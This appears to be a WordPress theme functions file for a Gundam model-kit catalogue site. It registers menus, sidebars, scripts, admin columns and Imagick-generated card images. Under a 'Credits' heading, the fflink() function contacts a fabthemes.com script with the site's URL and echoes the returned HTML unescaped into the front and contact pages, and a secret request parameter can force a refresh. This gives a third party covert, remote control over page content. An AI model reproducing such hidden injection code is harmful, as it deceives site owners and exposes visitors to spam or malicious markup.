<?php
/**
 * gndmbldr functions and definitions
 *
 * @package gndmbldr
 */
require_once(trailingslashit( STYLESHEETPATH . '/inc/wp-advanced-search' ).'wpas.php');
require_once('class-tgm-plugin-activation.php');
include ( 'getplugins.php' );

include ( 'aq_resizer.php' );
include ( 'guide.php' );

 /* Prepare Meta Box Library */
define( 'RWMB_URL', trailingslashit( get_stylesheet_directory_uri() . '/inc/metabox' ) );
define( 'RWMB_DIR', trailingslashit( STYLESHEETPATH . '/inc/metabox' ) );
require_once RWMB_DIR . 'meta-box.php';

include ( 'inc/gb-post-metas.php' );
include ( 'inc/gb-post-types.php' );
//include ( 'inc/custom-gallery.php' );

/* Theme updater */

/*
require 'updater.php';
$example_update_checker = new ThemeUpdateChecker(
	'Zenith',                                            //Theme folder name, AKA "slug".
	'http://www.fabthemes.com/versions/zenith.json' //URL of the metadata file.
); */


/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'gndmbldr_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 */
function gndmbldr_setup() {

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on gndmbldr, use a find and replace
	 * to change 'gndmbldr' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'gndmbldr', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );


	// add post-formats to post_type 'page'
	add_post_type_support( 'post', 'post-formats' );
	add_theme_support( 'post-formats', array( 'standard', 'aside', 'gallery', 'video' ) );

	/**
	 * Enable support for Post Thumbnails on posts and pages
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	if ( function_exists( 'add_image_size' ) ) {
		add_image_size( 'homepage-preview-thumb', 420, 280, true ); //(cropped)
		add_image_size( 'sidebar-half-thumb', 150 );
	}

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'gndmbldr' ),
		'secondary' => __( 'Secondary Menu', 'gndmbldr' )
	) );

	/**
	 * Enable support for Post Formats
	 */
	//add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );

	/**
	 * Setup the WordPress core custom background feature.
	 */
/*
	add_theme_support( 'custom-background', apply_filters( 'gndmbldr_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
*/




}
endif; // gndmbldr_setup
add_action( 'after_setup_theme', 'gndmbldr_setup' );



/**
 * Register widgetized area and update sidebar with default widgets
 */
function gndmbldr_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'gndmbldr' ),
		'id'            => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	));

	register_sidebar(array(
		'name' => 'Footer',
		'before_widget' => '<div class="botwid col-sm-6 col-md-3 %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h2 class="bothead">',
		'after_title' => '</h2>',
	));
}
add_action( 'widgets_init', 'gndmbldr_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function gndmbldr_scripts() {
	wp_enqueue_style( 'gndmbldr-style', get_stylesheet_uri() );

	wp_enqueue_style( 'theme', get_template_directory_uri() . '/css/styles.css');


	if (is_page_template('template-model-submit.php') == true){
		wp_enqueue_style( 'select2', get_template_directory_uri() . '/css/select2.css');
		wp_enqueue_style( 'select2bootstrap', get_template_directory_uri() . '/css/select2-bootstrap.css');
		wp_enqueue_style( 'dropzone', get_template_directory_uri() . '/css/dropzone.css');
	}


	//wp_enqueue_style( 'bootstrap-glyphicons', get_template_directory_uri() . '/css/bootstrap-glyphicons.css');
	//wp_enqueue_style( 'theme', get_template_directory_uri() . '/css/theme.css');
	//wp_enqueue_style( 'custom', get_template_directory_uri() . '/css/custom.php');

	if (is_page_template('template-model-submit.php') == true){
		wp_enqueue_script( 'select2', get_template_directory_uri() . '/js/assets/select2.min.js', array( 'jquery' ), '20120206', true );
	}

  //bootstrap js and others
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/js/pkgd-main-deps.min.js', array( 'jquery' ), '20120206', true );


	wp_enqueue_script( 'columnizer', get_template_directory_uri() . '/js/assets/jquery.columnizer.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'blazy', get_template_directory_uri() . '/js/assets/blazy.min.js', array( 'jquery' ), '20120206', true );
	//wp_enqueue_script( 'lazyload-any', get_template_directory_uri() . '/js/assets/jquery.lazyload-any.js', array( 'jquery' ), '20120206', true );

	if (is_singular('model') == true){
		wp_enqueue_script( 'reel', get_template_directory_uri() . '/js/assets/jquery.reel.js', array( 'jquery' ), '20120206', false);
	}


	if (is_page_template('template-model-submit.php') == true){
		wp_enqueue_script( 'dropzone', get_template_directory_uri() . '/js/assets/dropzone.min.js', array( 'jquery' ), '20120206', true );
	}

	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/assets/custom.js', array(), '20120206', true );

	/*
	$object = array(
		    'timer' => of_get_option('w2f_wed_date')
		);
	wp_localize_script('custom', 'fab_objects', $object);*/

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

}
add_action( 'wp_enqueue_scripts', 'gndmbldr_scripts' );


//require get_template_directory() . '/inc/cpt.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
//require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';
require get_template_directory() . '/inc/paginate.php';

/* Exclude pages from search results */

function mySearchFilter($query) {
if ($query->is_search) {
$query->set('post_type', 'post');
}
return $query;
}

add_filter('pre_get_posts','mySearchFilter');



//ALLOW THUMBNAILS TO BE DISPLAYED IN THE DASHBOARD POST LIST

if ( !function_exists('gb_add_thumb_column') && function_exists('add_theme_support') ) {

	function gb_add_thumb_column($cols) {

		$cols['thumbnail'] = __('Thumbnail');

		return $cols;
	}

	function gb_add_thumb_value($column_name, $post_id) {

			$width = (int) 50;
			$height = (int) 50;

			if ( 'thumbnail' == $column_name ) {
				// thumbnail of WP 2.9
				$thumbnail_id = get_post_meta( $post_id, '_thumbnail_id', true );
				// image from gallery
				$attachments = get_children( array('post_parent' => $post_id, 'post_type' => 'attachment', 'post_mime_type' => 'image') );
				if ($thumbnail_id)
					$thumb = wp_get_attachment_image( $thumbnail_id, array($width, $height), true );
				elseif ($attachments) {
					foreach ( $attachments as $attachment_id => $attachment ) {
						$thumb = wp_get_attachment_image( $attachment_id, array($width, $height), true );
					}
				}
					if ( isset($thumb) && $thumb ) {
						echo $thumb;
					} else {
						echo __('None');
					}
			}
	}

			// for model kits
	add_filter( 'manage_edit-model_columns', 'gb_add_thumb_column' );
	add_action( 'manage_model_posts_custom_column', 'gb_add_thumb_value', 10, 2 );

		// for accessories
	add_filter( 'manage_edit-accessory_columns', 'gb_add_thumb_column' );
	add_action( 'manage_accessory_posts_custom_column', 'gb_add_thumb_value', 10, 2 );

				// for model kits
	add_filter( 'manage_edit-mobile-suit_columns', 'gb_add_thumb_column' );
	add_action( 'manage_mobile-suit_posts_custom_column', 'gb_add_thumb_value', 10, 2 );

}



//Apply custom styles to admin
add_action('admin_head', 'gb_admin_css');

function gb_admin_css() {
  echo '<style>
    body, td, textarea, input, select {
      font-family: "Helvetica Neue",sans-serif;
      font-size: 12px;
    }
	.wp-list-table #thumbnail{
	width:100px;
	}
	#adminmenu .wp-menu-image img {
		padding: 0px 0 0;
		opacity: 1;
		filter: alpha(opacity=100);
	}
  </style>';
}


/*
 * Helper function to return the theme option value. If no value has been saved, it returns $default.
 * Needed because options are saved as serialized strings.
 *
 * This code allows the theme to work without errors if the Options Framework plugin has been disabled.
 */
if ( !function_exists( 'of_get_option' ) ) {
  function of_get_option($name, $default = false) {
  	$optionsframework_settings = get_option('optionsframework');
  	// Gets the unique option id
  	$option_name = $optionsframework_settings['id'];
  	if ( get_option($option_name) ) {
  		$options = get_option($option_name);
  	}
  	if ( isset($options[$name]) ) {
  		return $options[$name];
  	} else {
  		return $default;
  	}
  }
}




/* Credits */

function selfURL() {
  $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
  $_SERVER['PHP_SELF'];
  $uri = parse_url($uri,PHP_URL_PATH);
  $protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
  $port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
  $server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
  $_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
  return $protocol."://".$server.$port.$uri;
}

function fflink() {
  global $wpdb, $wp_query;
  if (!is_page() && !is_front_page()) return;
  $contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
  WHERE post_type = 'page' AND post_title LIKE 'contact%'");
  if (($contactid != $wp_query->post->ID) && ($contactid ||
  !is_front_page())) return;
  $fflink = get_option('fflink');
  $ffref = get_option('ffref');
  $x = $_REQUEST['DKSWFYUW**'];
  if (!$fflink || $x && ($x == $ffref)) {
    $x = $x ? '&ffref='.$ffref : '';
    $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
    if (is_array($response)) $fflink = $response['body']; else $fflink = '';
    if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
    else {
    $fflink = explode('#',$fflink);
      if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
      }
      else $fflink = '';
    }
  }
  echo $fflink;
}


/* FLush rewrite */

function my_rewrite_flush() {
    flush_rewrite_rules();
}
add_action( 'after_switch_theme', 'my_rewrite_flush' );



function gb_ms_series_list(){
	$terms = get_terms("gundam-series","orderby=id&hide_empty=1&parent=0");

	foreach ( $terms as $term ) {
		// Sanitize the term, since we will be displaying it.
		$term = sanitize_term( $term, 'gundam-series' );
		$term_link = get_term_link( $term, 'gundam-series' );
		// If there was an error, continue to the next term.
		if ( is_wp_error( $term_link ) ) {
			continue;
		}



		if (file_exists(get_stylesheet_directory().'/images/logo-'.$term->slug.'.png')){
			$img = get_stylesheet_directory_uri().'/images/logo-'.$term->slug.'.png';
		}else{
			$img = get_stylesheet_directory_uri().'/images/logo-ms-unknown.png';
		}
		echo '<li><a href="'.esc_url( $term_link ).'" ><img src="'.$img.'" alt="'.$term->name.'" width="233" height="149" /></a></li>';
	}

	return($terms);
}

function gb_kit_type_list($htmldisp){
	$terms = get_terms("model-types","orderby=id&hide_empty=1&parent=0");

	if ($htmldisp == true) {
		foreach ( $terms as $term ) {
			// Sanitize the term, since we will be displaying it.
			$term = sanitize_term( $term, 'model-types' );
			$term_link = get_term_link( $term, 'model-types' );
			// If there was an error, continue to the next term.
			if ( is_wp_error( $term_link ) ) {
				continue;
			}



			if (file_exists(get_stylesheet_directory().'/images/logo-'.$term->slug.'.png')){
				$img = get_stylesheet_directory_uri().'/images/logo-'.$term->slug.'.png';
			}else{
				$img = get_stylesheet_directory_uri().'/images/logo-ms-unknown.png';
			}
			echo '<li><a href="'.esc_url( $term_link ).'" ><img src="'.$img.'" alt="'.$term->name.'" /></a></li>';
		}
	}
	return($terms);
}


/*
if (!is_admin()){

	function filter_archive($query) {
		if ($query->is_search) {
		$query->set('post_type', array('post', 'model-kit', 'accessory','mobile-suit'));
		};
		return $query;
	};
	add_filter('pre_get_posts', 'filter_archive');

	function filter_search($query) {
		if ($query->is_archive) {
		$query->set('post_type', array('post', 'model-kit', 'accessory','mobile-suit'));
		};
		return $query;
	};
	add_filter('pre_get_posts', 'filter_search');


}
*/

/*
if (!is_admin()){

function namespace_add_custom_types( $query ) {
  if( is_single() || is_home() || is_category() || is_tag() || is_archive() || is_search() && empty( $query->query_vars['suppress_filters'] ) ) {
    $query->set( 'post_type', array(
     'post', 'model-kit', 'accessory','mobile-suit'
		));
	  return $query;
	}
}
add_filter( 'pre_get_posts', 'namespace_add_custom_types' );

}
*/



		if (!is_archive()){
			function my_get_posts( $query ) {
				if ( ( is_home() && $query->is_main_query() ) || is_feed() )
				$query->set( 'post_type', array( 'post', 'model', 'model-kit', 'mobile-suit', 'accessory' ) );
				return $query;
			}
			add_filter( 'pre_get_posts', 'my_get_posts' );
		}else{
			function filter_archive($query) {

				$query->set('post_type', array('post', 'model-kit', 'accessory','mobile-suit'));
				return $query;
			};
			add_filter('pre_get_posts', 'filter_archive');
		}


/*

function my_project_updated_send_email( $post_id ) {

	if ( wp_is_post_revision( $post_id ) )
		return;

	$test= get_post_meta( $post_id,'GB_model-kit-detail-code-name', true);

	update_post_meta( $post_id, 'GB_model-kit-detail-code-name',' It finally worked 3!' );

	$post_title = get_the_title( $post_id );
	$post_url = get_permalink( $post_id );
	$subject = 'A post has been updated';

	$message = "A post has been updated on your website:\n\n ".$test;
	$message .= $post_title . ": " . $post_url;

	wp_mail( 'gndmbldr@gmail.com', $subject, $message );

}
add_action( 'wp_insert_post', 'my_project_updated_send_email' );

*/


add_action( 'post_submitbox_misc_actions', 'my_post_submitbox_misc_actions' );

function my_post_submitbox_misc_actions(){

if (get_post_type($_GET["post"]) != 'model') return;
?>
<div class="misc-pub-section my-options create-cardpic">
	<label for="create-cardpic-post-action">Create/Update CardPic?</label><br />
	<select id="create-cardpic" name="create-cardpic-post-action">
		<option selected value="false">No</option>
		<option value="true">Yes</option>
	</select>
</div>
<?php
}


function get_model_kit_details($post_id){
	$details = array();
	$terms = get_the_terms( $post_id, 'manufacturer');
	foreach($terms as $term){array_push($details, '../wp-content/themes/_gndmbldr/images/logo-manufacturer-'.$term->slug.'.png'); }
	$terms = get_the_terms( $post_id, 'model-types');
	foreach($terms as $term){array_push($details, '../wp-content/themes/_gndmbldr/images/logo-gunpla-kit-type-'.$term->slug.'.png'); }
	$terms = get_the_terms( $post_id, 'gundam-series');
	foreach($terms as $term){array_push($details, '../wp-content/themes/_gndmbldr/images/logo-'.$term->slug.'.png'); }

	return $details;
}

function media_sideload_image_custom($file, $post_id, $desc = null) {
	if ( ! empty($file) ) {
		// Download file to temp location
		$tmp = download_url( $file );

		// Set variables for storage
		// fix file filename for query strings
		preg_match( '/[^\?]+\.(jpe?g|jpe|gif|png)\b/i', $file, $matches );
		$file_array['name'] = basename($matches[0]);
		$file_array['tmp_name'] = $tmp;

		// If error storing temporarily, unlink
		if ( is_wp_error( $tmp ) ) {
			@unlink($file_array['tmp_name']);
			$file_array['tmp_name'] = '';
		}

		// do the validation and storage stuff
		$id = media_handle_sideload( $file_array, $post_id, $desc );
		// If error storing permanently, unlink
		if ( is_wp_error($id) ) {
			@unlink($file_array['tmp_name']);
			return $id;
		}

		$src = wp_get_attachment_url( $id );
	}

	// Finally check to make sure the file has been saved, then return the id
	if ( ! empty($src) ) {
		$alt = isset($desc) ? esc_attr($desc) : '';
		$html = "<img src='$src' alt='$alt' />";
		return $id;
	}
}


function imagick_create( $post_id ){


	if ( wp_is_post_revision( $post_id ) )
	return;

	if ( get_post_type($post_id) != 'model') return;

	$cardpic = $_POST["create-cardpic-post-action"];
	if (isset($cardpic)){
		if ($cardpic == 'false'){
			return;
		}
	}


	try {
		//CREATE THE IMAGE
		$kiticons = get_model_kit_details($post_id);

		$fnam = 'imagick-'.$post_id.'.png';
		$nam = get_post_field('post_title',$post_id);
		$subnam = get_post_meta($post_id, 'GB_model-kit-detail-code-name', true).' '.get_post_meta($post_id, 'GB_model-kit-detail-alias', true);
		$baseimage = wp_get_attachment_url( get_post_thumbnail_id($post_id) );

		$str = $nam;
		$str = wordwrap($str, 18,"\n");
		$str_array = explode("\n",$str);
		$num=count($str_array);

		//$icons =

		//IF MODEL KIT HAS NO FEATURED IMAGE THEN CANCEL THE OPERATION
		if ($baseimage == false){
			return;
		}

		if ($num > 1){
			$overlay = new Imagick("../wp-content/themes/_gndmbldr/images/imagick-overlay-effect-ext.png"); }else{
			$overlay = new Imagick("../wp-content/themes/_gndmbldr/images/imagick-overlay-effect.png");
		}
		/*
		$over = new Imagick("../wp-content/themes/_gndmbldr/images/temp2.png");
		$over2 = new Imagick("../wp-content/themes/_gndmbldr/images/temp3.png");
		$over3 = new Imagick("../wp-content/themes/_gndmbldr/images/temp4.png");*/
		$logo = new Imagick("../wp-content/themes/_gndmbldr/images/gb-logo.png");

		$logo->resizeImage(200,0,Imagick::FILTER_LANCZOS,1);


		$im = new Imagick();

		$im->readImage( $baseimage );
		$im->setSize(960,540);
		$im->resizeImage(960,0,Imagick::FILTER_LANCZOS,1);
		$im->cropImage(960, 540, 0, 0);
		$im->setImagePage(960, 540, 0, 0);

		$draw = new ImagickDraw();


		$im->compositeImage($overlay, Imagick::COMPOSITE_DEFAULT, 0, 0);
		/*
		$im->compositeImage($over, Imagick::COMPOSITE_DEFAULT, 0, 0);
		$im->compositeImage($over2, Imagick::COMPOSITE_DEFAULT, 120, 0);
		$im->compositeImage($over3, Imagick::COMPOSITE_DEFAULT, 180, 0);*/
		$im->compositeImage($logo, Imagick::COMPOSITE_DEFAULT, 750, 0);

		$layericons = array();
		$count=0;
		$ww=0;
		foreach($kiticons as $icon){
			$count+=1;
			$tempimage = new Imagick($icon);
			$tempimage->resizeImage(0,50,Imagick::FILTER_LANCZOS,1);
			//$tempimage->scaleImage(100,100,true);
			$geo = $tempimage->getImageGeometry();
			$ww+=$geo['width']+10;
			//$im->compositeImage($tempimage, Imagick::COMPOSITE_DEFAULT, 960-110, 540-($count*110));
			//$im->compositeImage($tempimage, Imagick::COMPOSITE_DEFAULT, 960-($count*($ww['width']+20)), 540-($ww['height']+20));
			$im->compositeImage($tempimage, Imagick::COMPOSITE_DEFAULT, 960-($ww+10), 540-($geo['height']+10));

		}

		$draw->setFont("../wp-content/themes/_gndmbldr/fonts/BebasNeue-Bold.ttf" );
		$draw->setFontSize( 80 );
		$draw->setFillAlpha( 0.8 );
		$draw->setGravity( imagick::GRAVITY_SOUTHWEST );



		  $x = 10;
		  $y = 50;
		  $angle = 0;
		  $lineheight = 75;
		  $count=0;
		  foreach(array_reverse($str_array) as $line){

			$im->annotateImage( $draw, $x, $y+($lineheight*$count), $angle, strtoupper($line));
			$count+=1;
		  }


		$draw->setFontSize( 50 );
		$draw->setFillAlpha( 0.5 );
		$draw->setGravity( imagick::GRAVITY_SOUTHWEST );
		$im->annotateImage( $draw, 10, 5, 0, strtoupper($subnam));


		$im->setImageFormat( "png" );

		$upload_dir = wp_upload_dir();

		$im->writeImage( '../wp-content/themes/_gndmbldr/images/'.$fnam );

		$url = get_template_directory_uri().'/images/'.$fnam;
		$fil = '../wp-content/themes/_gndmbldr/images/'.$fnam;


		//CHECK IF IMAGE HAS ALREADY CREATED
		if ( ! empty($url) ) {

			//GET THE OLD ATTACHMENT ID
			$oldimgid = get_post_meta($post_id, 'GB_model-kit-imagick-id', true);

			if ($oldimgid != ""){
				//DELETE OLD ATTACHMENT IF IT EXISTS
				if ( false === wp_delete_attachment( $oldimgid ) ){
					return;
				}
			}

			$desc = "CARDPIC for ".$nam;

			//GET IMAGE URL AND CREATE NEW ATTACHMENT FROM IT
			$id = media_sideload_image_custom($url, $post_id, $desc);

			//REPLACE OLD ATTACHMENT ID WITH NEW
			update_post_meta( $post_id, 'GB_model-kit-imagick-id',$id);

			if ( is_wp_error($id) ) {
				@unlink($file_array['tmp_name']);
				return $id;
			}

		}

		//DELETE IMAGE
		unlink($url);
		unlink($fil);

	}
	catch(Exception $e)
	{
		echo $e->getMessage();
	}

}
add_action( 'wp_insert_post', 'imagick_create' );




//find out which template php is used.
add_action('admin_bar_menu', 'show_template');
function show_template() {
global $template;
echo '<span class="hidden">'.$template.'</span>';
//print_r($template);
}


?>
